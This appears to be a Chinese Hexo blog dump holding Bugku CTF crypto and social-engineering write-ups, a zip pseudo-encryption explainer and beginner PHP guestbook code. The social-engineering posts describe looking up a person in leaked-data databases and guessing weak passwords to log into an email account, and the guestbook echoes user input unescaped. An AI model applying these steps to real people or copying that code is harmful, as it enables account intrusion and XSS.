class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>]</span><br><span class="line">str2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">str2 = str2+chr(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print str2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##下面步骤是是百度的</span></span><br><span class="line"><span class="keyword">from</span> HTMLParser <span class="keyword">import</span> HTMLParser</span><br><span class="line">h = HTMLParser() </span><br><span class="line">s = h.unescape(h.unescape(str2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>得到一个Unicode编码，放在站长工具跑一下，得到一串ASCII码，再来转义一下，发现是html编码，解码之后发现还有URL编码，放在站长工具上跑一下就行<br><img src="https://s1.ax1x.com/2018/05/20/CgRjit.png" alt="CgRjit.png"></p><p>其实网上还有一中简单的方法，用一个叫converter的工具,方法自己找</p><h2 id=""><a href="#" class="headerlink" title=".!?"></a>.!?</h2><p>另类的Ook编码<br>直接去网站解码即可</p><h2 id="-1"><a href="#-1" class="headerlink" title="+[]-"></a>+[]-</h2><p>另类的brainfuck编码，直接去网站解码即可</p><h2 id="0x09-奇怪的密码"><a href="#0x09-奇怪的密码" class="headerlink" title="0x09 奇怪的密码"></a>0x09 奇怪的密码</h2><p>给的提示不知道是啥，只能一个个试一下，又毫无头绪，再看看题目，发现那一段密文特别像flag，于是对比gndk与flag的ASCII码，突然发现是依次减少的<br>于是分别用C还有python写个脚本解密，得到flag,代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line">#<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> a[]=<span class="string">"gndk€rlqhmtkwwp&#125;z"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(a);i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=a[i]-(i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">##encoding:utf-8</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class="line"><span class="comment">##print str1</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line"> flag = flag+chr((ord(i)-count))</span><br><span class="line"> count=count+<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="托马斯-杰斐逊"><a href="#托马斯-杰斐逊" class="headerlink" title="托马斯.杰斐逊"></a>托马斯.杰斐逊</h2><p>这是个杰斐逊密码盘，根据第一个密钥跟密文，把第二行单独取出来，然后从的地方开始，放到内容最前面<br>例如<code>：&lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;   --&gt;   &lt;HGVSFUWIKPBELNACZDTRXMJQOY &lt;</code><br>最后得到下面的密文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HGVSFUWIKPBELNACZDTRXMJQOY </span><br><span class="line">CPMNZQWXYIHFRLABEUOTSGJVDK </span><br><span class="line">BVIQHKYPNTCRMOSFEZWAXJGDLU </span><br><span class="line">TEQGYXPLOCKBDMAIZVRNSJUWFH </span><br><span class="line">SLOQXVETAMKGHIWPNYCJBFZDRU </span><br><span class="line">XQYIZMJWAORPLNDVHGFCUKTEBS </span><br><span class="line">WATDSRFHENYVUBMCOIKZGJXPLQ </span><br><span class="line">CEONJQGWTHSPYBXIZULVKMRAFD </span><br><span class="line">RJLXKISEFAPMYGHBQNOZUTWDCV </span><br><span class="line">QWXPHKZGJTDSENYVUBMLAOIRFC </span><br><span class="line">GOIKFHENYVUWABMCXPLTDSRJQZ </span><br><span class="line">LTDENQWAOXPYVUIKZGJBMCSRFH </span><br><span class="line">ENYSRUBMCQWVJXPLTDAOIKFZGH </span><br><span class="line">SWAYXPLVUBOIKZGJRFHENMCQTD</span><br></pre></td></tr></table></figure></p><p>然后一列列去尝试，倒数第六列是flag<br>最后提交的flag是小写</p><h2 id="0x11-伪加密"><a href="#0x11-伪加密" class="headerlink" title="0x11 伪加密"></a>0x11 伪加密</h2><p>上次的博客内容就介绍过，不多说，把09改为00即可</p><h2 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a>告诉你个秘密</h2><p>发现没有超过F的字母，边猜测是16进制，然后16进制转码，发现一串全都是数字跟字母的字符串，应该是Base64<br><img src="https://s1.ax1x.com/2018/05/20/CgRvJP.png" alt="CgRvJP.png"><br>解码后发现几组英文。。。。<br><img src="https://s1.ax1x.com/2018/05/20/CgRxRf.png" alt="CgRxRf.png"><br>发现跟上次校赛的键盘题格式差不多，猜测应是键盘密码，这题格式试了好久，都快想说MMP了，google之后才知道这题格式是flag:xxxxxxx(全是大写)<br>坑惨了!!</p><h2 id="来自宇宙的信号"><a href="#来自宇宙的信号" class="headerlink" title="来自宇宙的信号"></a>来自宇宙的信号</h2><p>百度银河字母，对照着下图就能找到flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2cNt.jpg" alt="Cg2cNt.jpg"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku Social write up</title>
      <link href="/2018/02/08/bugku-social-wp/"/>
      <url>/2018/02/08/bugku-social-wp/</url>
      <content type="html"><![CDATA[<h2 id="密码？？？"><a href="#密码？？？" class="headerlink" title="密码？？？"></a>密码？？？</h2><p>根据提示直接猜测密码为zs19970315，尝试成功<br><img src="https://s1.ax1x.com/2018/05/20/CggIFx.png" alt="CggIFx.png"><br><a id="more"></a></p><h2 id="域名解析？"><a href="#域名解析？" class="headerlink" title="域名解析？"></a>域名解析？</h2><p>直接改本地的host文件，win10的话在’C:\Windows\System32\drivers\etc’目录下，记得用管理权限打开<br>里面添加一行120.24.86.145  flag.bugku.com<br>然后浏览器打开flag.bugku.com获得key<br><img src="https://s1.ax1x.com/2018/05/20/CggTfK.png" alt="CggTfK.png"></p><h2 id="信息查找？？？"><a href="#信息查找？？？" class="headerlink" title="信息查找？？？"></a>信息查找？？？</h2><p>百度找到网页：<code>http://www.xiukee.com/show_356966.html</code><br>有个提示是flag是群号码，那我就试一下群号码试就行了，成功过关</p><h2 id="简单个人信息收集"><a href="#简单个人信息收集" class="headerlink" title="简单个人信息收集"></a>简单个人信息收集</h2><p>把压缩包下载下来之后发现是伪加密，拖进HXD中查找16进制，<br><img src="https://s1.ax1x.com/2018/05/20/Cggq6e.png" alt="Cggq6e.png"><br>把图中红色的09改为00，因为基数是伪加密。<br>可参考：<a href="http://0verwatch.top/2018/02/08/zipfalse/">http://0verwatch.top/2018/02/08/zipfalse/</a><br>打开压缩包发现一个txt文件，叫我寻找下图的信息，<br><img src="https://s1.ax1x.com/2018/05/20/Cg2lX4.png" alt="Cg2lX4.png"><br>翻墙找个社工库查一查，但很多社工库都挂掉了，我直接看的别人的wp得到的结果。。。<br>手机号码是15206164164</p><h2 id="入门题目，社工帝？"><a href="#入门题目，社工帝？" class="headerlink" title="入门题目，社工帝？"></a>入门题目，社工帝？</h2><p>给了个名字给我，上谷歌一句搜索命令：intitle:孤长离，第一个就是它的贴吧<br><img src="https://s1.ax1x.com/2018/05/20/Cg23nJ.png" alt="Cg23nJ.png"><br>里面有个163的邮箱，又根据提示是弱口令，百度弱口令，一个个试，因为163邮箱有验证码就不能用bp去爆破，还是手动试吧，我试到第二个就是了。<br>在里面找到flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2Nh6.png" alt="Cg2Nh6.png"></p><h2 id="简单的社工尝试"><a href="#简单的社工尝试" class="headerlink" title="简单的社工尝试"></a>简单的社工尝试</h2><p>拿到一个图片邮件啥东西都没有，只能去binwalk一下了，发现里面有个压缩包，打开一看啥都没有<br>又看了看题目，说是头像，这时候意识到自己想错方向了，不应该往misc方向想的<br>于是乎就用百度识图看一看。。又是什么都没有。。。。<br><a href="https://imgchr.com/i/Cg2a9K" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cg2a9K.md.png" alt="Cg2a9K.md.png"></a><br>再来谷歌识图，这次找到一个github上的bugku，翻来翻去还是没找到flag<br>最后发现一个微博链接，<br><img src="https://s1.ax1x.com/2018/05/20/Cg2d1O.png" alt="Cg2d1O.png"><br>点进去发现一个醒目的图片<br><img src="https://s1.ax1x.com/2018/05/20/Cg2wcD.png" alt="Cg2wcD.png"><br>再打开一看，bingo找到flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2DnH.png" alt="Cg2DnH.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Social </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>zip伪加密[转载]</title>
      <link href="/2018/02/08/zipfalse/"/>
      <url>/2018/02/08/zipfalse/</url>
      <content type="html"><![CDATA[<p>纯粹复习一下伪加密</p><a id="more"></a><h2 id="原理"><a name="t1"></a>原理</h2><hr><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</p><h2 id="背景"><a name="t2"></a>背景</h2><hr><p>首先，我们来看zip文件头协议。这里以中文资料为证，但是仍然建议大家去<a href="https://www.pkware.com" target="_blank">http://www.pkware.com</a>  阅读官方文档，虽然英文读起来有些困难。</p><blockquote><br>  <p><strong>一个 ZIP 文件由三个部分组成：</strong>  </p><br><br>  <p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 <br><br>    <a href="https://blog.csdn.net/wclxyn/article/details/7288994" target="_blank">查看详情</a></p><br></blockquote><h2 id="实例"><a name="t3"></a>实例</h2><p>下面给出西普的一个实例： <br><br><img src="https://s1.ax1x.com/2018/05/20/CggXmd.png" alt="这里写图片描述" title=""> <br><br><strong>压缩源文件数据区：</strong>  <br><br>50 4B 03 04：这是头文件标记（0x04034b50） <br><br>14 00：解压文件所需 pkware 版本  <br><br>00 00：全局方式位标记（有无加密）  <br><br>08 00：压缩方式  <br><br>5A 7E：最后修改文件时间  <br><br>F7 46：最后修改文件日期  <br><br>16 B5 80 14：CRC-32校验（1480B516） <br><br>19 00 00 00：压缩后尺寸（25） <br><br>17 00 00 00：未压缩尺寸（23） <br><br>07 00：文件名长度  <br><br>00 00：扩展记录长度  <br><br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 <br><br><strong>压缩源文件目录区：</strong>  <br><br>50 4B 01 02：目录中文件文件头标记(0x02014b50) <br><br>3F 00：压缩使用的 pkware 版本  <br><br>14 00：解压文件所需 pkware 版本  <br><br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）  <br><br>08 00：压缩方式  <br><br>5A 7E：最后修改文件时间  <br><br>F7 46：最后修改文件日期  <br><br>16 B5 80 14：CRC-32校验（1480B516） <br><br>19 00 00 00：压缩后尺寸（25） <br><br>17 00 00 00：未压缩尺寸（23） <br><br>07 00：文件名长度  <br><br>24 00：扩展字段长度  <br><br>00 00：文件注释长度  <br><br>00 00：磁盘开始号  <br><br>00 00：内部文件属性  <br><br>20 00 00 00：外部文件属性  <br><br>00 00 00 00：局部头部偏移量  <br><br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 <br><br><strong>压缩源文件目录结束标志：</strong>  <br><br>50 4B 05 06：目录结束标记  <br><br>00 00：当前磁盘编号  <br><br>00 00：目录区开始磁盘编号  <br><br>01 00：本磁盘上纪录总数  <br><br>01 00：目录区中纪录总数  <br><br>59 00 00 00：目录区尺寸大小  <br><br>3E 00 00 00：目录区对第一张磁盘的偏移量  <br><br>00 00：ZIP 文件注释长度</p><h2 id="猜想"><a name="t4"></a>猜想</h2><hr><p>所以如果把一个zip文件的文件头或者加密标志位进行适当修改，那就可能会改变文件的可读性了呗！</p><h2 id="测试一"><a name="t5"></a>测试（一）</h2><hr><p>亲测例子：先压缩一个1.zip，再用Winhex打开，如下图：</p><p><img src="https://s1.ax1x.com/2018/05/20/CggvTI.png" alt="这里写图片描述" title=""></p><p><strong>压缩源文件数据区：</strong> <br><br>50 4B 03 04：这是头文件标记 <br><br>14 00：解压文件所需 pkware 版本  <br><br>00 00：全局方式位标记（有无加密） <br><br>08 00：压缩方式  <br><br>07 76：最后修改文件时间  <br><br>F2 48：最后修改文件日期  <br><br>…… <br><br><strong>压缩源文件目录区：</strong>  <br><br>50 4B 01 02：目录中文件文件头标记(0x02014b50) <br><br>1F 00：压缩使用的 pkware 版本  <br><br>14 00：解压文件所需 pkware 版本  <br><br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）  <br><br>08 00：压缩方式 <br><br>07 76：最后修改文件时间  <br><br>F2 48：最后修改文件日期 <br><br>……</p><blockquote><br>  <p>综上所述，如果把第二个加密标记位的00 00改为09 00，打开就会提示有密码： <br><br>  <img src="https://s1.ax1x.com/2018/05/20/Cggzkt.png" alt="这里写图片描述" title=""> <br><br>  <img src="https://s1.ax1x.com/2018/05/20/Cg2P1S.png" alt="这里写图片描述" title=""></p><br></blockquote><p>于是乎，这样就达到了zip伪加密的目的，可是这里又有一个疑问了，你可能会问，为什么改成09，而不是其他的数字呢，其实改成09只是举的一个例子，只要末位是奇数，就代表加密，反之，末位是偶数代表未加密（这是我猜想的，具体操作也符合我的猜想，可我不知道这个原理是什么，如果你了解的话，欢迎来分享分享~^_^）</p><h2 id="测试二"><a name="t6"></a>测试（二）</h2><hr><p><strong>猜想：</strong></p><p>既然加密标志位可以修改，那头文件标记位应该也能修改吧，试试咯~：</p><p><img src="https://s1.ax1x.com/2018/05/20/Cg2E0s.png" alt="这里写图片描述" title=""></p><p>把文本区原来显示的PK位的50 4B改成其他数据，再打开zip文件：</p><p><img src="https://s1.ax1x.com/2018/05/20/Cg2V7n.png" alt="这里写图片描述" title=""> <br><br>显然，这样也使zip文件不可读！</p><h2 id="识别真假加密"><a name="t4"></a>识别真假加密</h2><h3 id="无加密"><a name="t5"></a>无加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code> <br><br>且压缩源文件目录区的全局方式位标记应当为<code>00 00</code></p><h3 id="假加密"><a name="t6"></a>假加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code> <br><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h3 id="真加密"><a name="t7"></a>真加密</h3><p>压缩源文件数据区的全局加密应当为<code>09 00</code> <br><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code> <br><br><img src="https://s1.ax1x.com/2018/05/20/Cg2FXQ.png" alt="这里写图片描述" title=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php+mysql留言板实现代码分享</title>
      <link href="/2018/02/07/php-mysql-content/"/>
      <url>/2018/02/07/php-mysql-content/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  今天没什么想说的，直接上正文吧。。。。。。。。</p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>  在前几天学习的基础上，自己重新把功能实现一遍，并把自己的总结都写在代码的注释里面。。。</p><h3 id="上次忘了的sql-PHP的查询总结"><a href="#上次忘了的sql-PHP的查询总结" class="headerlink" title="上次忘了的sql+PHP的查询总结"></a>上次忘了的sql+PHP的查询总结</h3><p> mysqli查询结果：<br>1.用它的mysqli_result类，文档是这样说的 “代表从一个数据库查询中获取的结果集” 。。。<br>query语句执行完以后一般是返回<code>true</code>跟<code>false</code>，但如果执行的是select语句的话，返回的就是一个对象了，但是执行不成功肯定是<code>false</code>，所以一般前面要先判断。。</p><p>2.如果他是对象的话，那么就可以调用<code>mysqli_result</code>类下的<code>fetch_array()</code>函数，这个函数是不可逆的，就是显示完以后重复加载该函数没用，要解决的这种情况我们可以用一个数组存储一下。。。<br>  如果里面什么都不填的话他返回的数组里面即含有索引，又含有字段，详细可以自己用<code>var_dump</code>函数测试一下。。。<br>所以可以用一个常量<code>MYSQLI_ASSOC</code>，注意常量不需要引号，也不需要<code>$</code>符</p><h3 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h3><p> 由于http是无记忆的，关闭网页后会消失数据，因此才要用数据库去存储数据<br> 所以我们用session跟cookie来实现登录功能，我用的是session，因为session一般都在服务器端，比较安全</p><h3 id="还有几点注意事项"><a href="#还有几点注意事项" class="headerlink" title="还有几点注意事项"></a>还有几点注意事项</h3><p>1.Undefined index:的错误，这种错误我出现了很多次，主要是post或者get请求为空导致的，后来是在class类里面调用了isset函数解决的…..</p><p>2.代码中所有注释中的var_dump函数都是用做测试</p><p>3.还有就是html语句跟PHP语句的混写一定要小心，很容易就会写错</p><p>4.我用的是PHPstudy搭建的环境，数据库起名PHP10</p><h3 id="下面就附上代码"><a href="#下面就附上代码" class="headerlink" title="下面就附上代码"></a>下面就附上代码</h3><p>1.book.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">留言板首页</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> (<span class="string">'connect.php'</span>);</span><br><span class="line">    <span class="keyword">include</span> (<span class="string">'mysql.php'</span>);</span><br><span class="line">    <span class="comment">//var_dump($_SESSION);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> date_default_timezone_set(<span class="string">"PRC"</span>);  <span class="comment">//这句话解决的是It is not safe to rely on the system's timezone settings报错 </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;留言板&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.wrap &#123;</span><br><span class="line">              width:<span class="number">800</span>px; </span><br><span class="line">              margin:<span class="number">0</span>px auto;</span><br><span class="line">              </span><br><span class="line">         &#125;</span><br><span class="line">   .add &#123;overflow: hidden;&#125;</span><br><span class="line">   .add .content &#123;</span><br><span class="line">                  width: <span class="number">798</span>px;</span><br><span class="line">                  margin: :<span class="number">0</span>;</span><br><span class="line">                  padding: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    .add .user&#123;float: left;&#125;</span><br><span class="line">    .add .btn&#123;float: right;&#125;</span><br><span class="line">    .msg&#123; margin:<span class="number">20</span>px <span class="number">0</span>px;background: <span class="comment">#ccc; padding:5px;&#125;</span></span><br><span class="line">    .msg .info&#123;overflow: hidden;&#125;</span><br><span class="line">    .msg .user&#123;float: left;color:blue;&#125;</span><br><span class="line">    .msg .time&#123;float:right;color:<span class="comment">#999;&#125;</span></span><br><span class="line">    .msg .content&#123;width:<span class="number">100</span>%padding:<span class="number">5</span>px;&#125;</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;div class="wrap"&gt;</span><br><span class="line">    &lt;!-- 发表留言 --&gt;</span><br><span class="line">    &lt;div class="add"&gt;</span><br><span class="line">    &lt;form action=<span class="string">'save.php'</span> method=<span class="string">'post'</span> &gt;</span><br><span class="line">    &lt;textarea  class="content" name='content' cols="50" rows="5"&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;input class="user" type="text"  name='user' /&gt;</span><br><span class="line">    &lt;input class="btn" type="submit" value="发表留言"/&gt;</span><br><span class="line">    &lt;a <span class="class"><span class="keyword">class</span>='<span class="title">btn</span>' <span class="title">href</span>='<span class="title">login</span>.<span class="title">php</span>'&gt;登录&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line">    foreach ($d as $row ) &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;!--查看留言 --&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>='<span class="title">msg</span>'&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>='<span class="title">info</span>'&gt;</span></span><br><span class="line">    &lt;span class='user'&gt;&lt;?php echo $row['user'] ;?&gt;&lt;/span&gt;</span><br><span class="line">    &lt;span class ='time'&gt;&lt;?php echo date("Y-m-d H:i:s",$row['intime']);?&gt;  &lt;!--用了date函数改变一下格式--&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) == <span class="keyword">true</span>) &#123;<span class="meta">?&gt;</span></span><br><span class="line">    &lt;a onclick=<span class="string">"return confirm('你确定要删除吗？')"</span> href=<span class="string">"delete.php?id=&lt;?php echo $row['id'];?&gt;"</span>&gt;删除&lt;/a&gt;&lt;/span&gt;   </span><br><span class="line">    &lt;!--这里用onclick去写js--&gt;    </span><br><span class="line">    <span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>='<span class="title">content</span>'&gt;</span></span><br><span class="line">      &lt;?php echo $row['content'] ;?&gt;</span><br><span class="line">       &lt;/div&gt;</span><br><span class="line">        